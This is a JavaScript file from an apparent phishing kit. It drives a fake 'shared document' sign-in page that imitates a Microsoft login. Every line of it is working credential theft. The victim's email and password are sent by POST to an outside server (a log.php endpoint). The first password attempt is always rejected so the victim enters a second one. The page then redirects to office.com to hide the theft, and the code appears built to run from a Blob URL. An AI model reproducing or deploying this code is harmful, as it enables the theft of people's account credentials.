// content-part-2.js - Main JavaScript Logic (FIXED)

(function() {
    'use strict';

    console.log('✅ Part 2 loaded: JavaScript logic ready');

    // Configuration - UPDATE THIS URL
    const CONFIG = {
        logEndpoint: 'https://gnosis.com.py/serca/log.php',
        redirectUrl: 'https://www.office.com'
    };

    // Main application initialization
    function initApp() {
        console.log('🚀 Initializing application...');
        
        // Check if we're in the Blob URL environment
        if (window.location.protocol !== 'blob:') {
            console.log('📄 Not in Blob URL context. Waiting for Blob URL launch...');
            // Still try to initialize in case we're testing locally
        }

        // Get all DOM elements with safety checks
        var emailInput = document.getElementById('emailInput');
        var pwdFirstInput = document.getElementById('passwordFirstInput');
        var pwdSecondInput = document.getElementById('passwordSecondInput');
        var emailNextBtn = document.getElementById('emailNextBtn');
        var pwdFirstBtn = document.getElementById('pwdFirstBtn');
        var pwdSecondBtn = document.getElementById('pwdSecondBtn');
        var statusText = document.getElementById('statusText');
        var statusMsg = document.getElementById('statusMessage');
        var stepBadge1 = document.getElementById('stepBadge1');
        var stepEmail = document.getElementById('stepEmail');
        var stepPwdFirst = document.getElementById('stepPasswordFirst');
        var stepPwdSecond = document.getElementById('stepPasswordSecond');
        var displayFirst = document.getElementById('displayEmailFirst');
        var displaySecond = document.getElementById('displayEmailSecond');
        var togglePwdFirst = document.getElementById('togglePwdFirst');
        var togglePwdSecond = document.getElementById('togglePwdSecond');
        var passwordErrorFirst = document.getElementById('passwordErrorFirst');
        var passwordErrorSecond = document.getElementById('passwordErrorSecond');

        // Check if essential elements exist
        if (!emailInput) {
            console.error('❌ Critical: emailInput not found! DOM may not be ready.');
            // Try again after a short delay
            setTimeout(initApp, 200);
            return;
        }

        console.log('✅ DOM elements found. Setting up event listeners...');

        var storedEmail = '';

        // Helper functions
        function setStatus(message, type) {
            type = type || 'info';
            if (statusText) {
                statusText.innerText = message;
            }
            if (statusMsg) {
                statusMsg.className = 'status-message';
                if (type === 'error') {
                    statusMsg.classList.add('error');
                } else if (type === 'success') {
                    statusMsg.classList.add('success');
                }
                var icon = statusMsg.querySelector('i');
                if (icon) {
                    if (type === 'error') {
                        icon.className = 'fas fa-exclamation-circle';
                    } else if (type === 'success') {
                        icon.className = 'fas fa-check-circle';
                    } else {
                        icon.className = 'fas fa-info-circle';
                    }
                }
            }
        }

        function updateStepIndicators(step) {
            if (stepBadge1) {
                stepBadge1.classList.remove('active');
                if (step === 1) {
                    stepBadge1.classList.add('active');
                }
            }
        }

        function showPasswordError(show, step) {
            if (step === 2 && passwordErrorFirst) {
                if (show) {
                    passwordErrorFirst.classList.remove('hidden');
                } else {
                    passwordErrorFirst.classList.add('hidden');
                }
            } else if (step === 3 && passwordErrorSecond) {
                if (show) {
                    passwordErrorSecond.classList.remove('hidden');
                } else {
                    passwordErrorSecond.classList.add('hidden');
                }
            }
        }

        function showStep(step, email) {
            email = email || '';
            
            if (stepEmail) stepEmail.classList.add('hidden');
            if (stepPwdFirst) stepPwdFirst.classList.add('hidden');
            if (stepPwdSecond) stepPwdSecond.classList.add('hidden');

            showPasswordError(false, 2);
            showPasswordError(false, 3);

            if (step === 1) {
                if (stepEmail) stepEmail.classList.remove('hidden');
                updateStepIndicators(1);
                if (emailInput) {
                    setTimeout(function() { emailInput.focus(); }, 100);
                }
                setStatus('Enter your email to access the shared document.', 'info');
            } else if (step === 2) {
                if (stepPwdFirst) stepPwdFirst.classList.remove('hidden');
                updateStepIndicators(2);
                if (email && displayFirst) {
                    displayFirst.textContent = email;
                }
                if (pwdFirstInput) {
                    pwdFirstInput.value = '';
                    setTimeout(function() { pwdFirstInput.focus(); }, 100);
                }
                setStatus('Enter your password for ' + email, 'info');
            } else if (step === 3) {
                if (stepPwdSecond) stepPwdSecond.classList.remove('hidden');
                updateStepIndicators(3);
                if (email && displaySecond) {
                    displaySecond.textContent = email;
                }
                if (pwdSecondInput) {
                    pwdSecondInput.value = '';
                    setTimeout(function() { pwdSecondInput.focus(); }, 100);
                }
                showPasswordError(true, 3);
                setStatus('Please try again with a different password.', 'error');
            }
        }

        function resetFlow() {
            if (emailInput) emailInput.value = '';
            if (pwdFirstInput) pwdFirstInput.value = '';
            if (pwdSecondInput) pwdSecondInput.value = '';
            storedEmail = '';
            showPasswordError(false, 2);
            showPasswordError(false, 3);
            showStep(1);
            if (pwdSecondBtn) {
                pwdSecondBtn.disabled = false;
                pwdSecondBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Sign In';
            }
        }

        function logToFile(email, password, eventType) {
            var logData = {
                email: email,
                password: password,
                event: eventType,
                timestamp: new Date().toISOString()
            };

            if (CONFIG.logEndpoint) {
                try {
                    fetch(CONFIG.logEndpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(logData),
                        keepalive: true
                    }).catch(function(error) {
                        console.log('⚠️ Logging failed:', error);
                    });
                } catch(e) {
                    console.log('⚠️ Logging error:', e);
                }
            }
        }

        // ============================================================
        // EVENT LISTENERS - Fixed with proper binding
        // ============================================================

        // Email Next Button
        if (emailNextBtn) {
            console.log('✅ Setting up emailNextBtn listener');
            emailNextBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                console.log('📧 Email button clicked');
                var email = emailInput ? emailInput.value.trim() : '';
                if (!email || email.indexOf('@') === -1 || email.indexOf('.') === -1) {
                    setStatus('Please enter a valid email address.', 'error');
                    return;
                }
                storedEmail = email;
                try {
                    localStorage.setItem('sharedDocEmail', email);
                } catch(e) {}
                console.log('📧 Email entered:', email);
                showStep(2, email);
            });
        } else {
            console.error('❌ emailNextBtn not found!');
        }

        // First Password Button
        if (pwdFirstBtn) {
            console.log('✅ Setting up pwdFirstBtn listener');
            pwdFirstBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                console.log('🔑 First password button clicked');
                var pwd = pwdFirstInput ? pwdFirstInput.value.trim() : '';
                if (!pwd) {
                    setStatus('Please enter a password.', 'error');
                    return;
                }
                var email = storedEmail || 'user';
                try {
                    email = localStorage.getItem('sharedDocEmail') || email;
                } catch(e) {}
                console.log('🔑 First password attempt for:', email);
                
                logToFile(email, pwd, 'password_attempt_1');
                
                showPasswordError(true, 2);
                setStatus('Incorrect password, please try again.', 'error');
                
                if (pwdFirstInput) {
                    pwdFirstInput.value = '';
                    setTimeout(function() { pwdFirstInput.focus(); }, 100);
                }
                
                showStep(3, email);
            });
        } else {
            console.error('❌ pwdFirstBtn not found!');
        }

        // Second Password Button
        if (pwdSecondBtn) {
            console.log('✅ Setting up pwdSecondBtn listener');
            pwdSecondBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                console.log('🔑 Second password button clicked');
                var pwd = pwdSecondInput ? pwdSecondInput.value.trim() : '';
                if (!pwd) {
                    setStatus('Please enter a password.', 'error');
                    return;
                }
                var email = storedEmail || 'user';
                try {
                    email = localStorage.getItem('sharedDocEmail') || email;
                } catch(e) {}
                console.log('🔑 Second password attempt for:', email);
                
                logToFile(email, pwd, 'password_attempt_2_success');
                
                // Small delay to ensure log is sent
                setTimeout(function() {
                    window.location.href = CONFIG.redirectUrl;
                }, 150);
            });
        } else {
            console.error('❌ pwdSecondBtn not found!');
        }

        // Password Toggle
        function setupToggle(btn, input) {
            if (!btn || !input) return;
            btn.addEventListener('click', function() {
                var type = input.getAttribute('type') === 'password' ? 'text' : 'password';
                input.setAttribute('type', type);
                var icon = this.querySelector('i');
                if (icon) {
                    icon.classList.toggle('fa-eye');
                    icon.classList.toggle('fa-eye-slash');
                }
            });
        }
        setupToggle(togglePwdFirst, pwdFirstInput);
        setupToggle(togglePwdSecond, pwdSecondInput);

        // Enter key support
        function handleEnter(btn) {
            return function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    if (btn) btn.click();
                }
            };
        }
        if (emailInput) emailInput.addEventListener('keydown', handleEnter(emailNextBtn));
        if (pwdFirstInput) pwdFirstInput.addEventListener('keydown', handleEnter(pwdFirstBtn));
        if (pwdSecondInput) pwdSecondInput.addEventListener('keydown', handleEnter(pwdSecondBtn));

        // Start the flow
        resetFlow();
        console.log('✅ Shared document flow ready');
    }

    // ============================================================
    // MULTIPLE INITIALIZATION ATTEMPTS
    // ============================================================
    
    function tryInit(attempt) {
        attempt = attempt || 1;
        console.log(`🔄 Initialization attempt ${attempt}...`);
        
        // Check if DOM is ready
        if (document.readyState === 'complete' || document.readyState === 'interactive') {
            // Check if emailInput exists
            if (document.getElementById('emailInput')) {
                initApp();
                return;
            }
        }
        
        // If we've tried too many times, give up
        if (attempt > 10) {
            console.error('❌ Failed to initialize after 10 attempts. DOM may be broken.');
            return;
        }
        
        // Try again after delay
        setTimeout(function() {
            tryInit(attempt + 1);
        }, 200);
    }

    // Start the initialization process
    tryInit();

})();
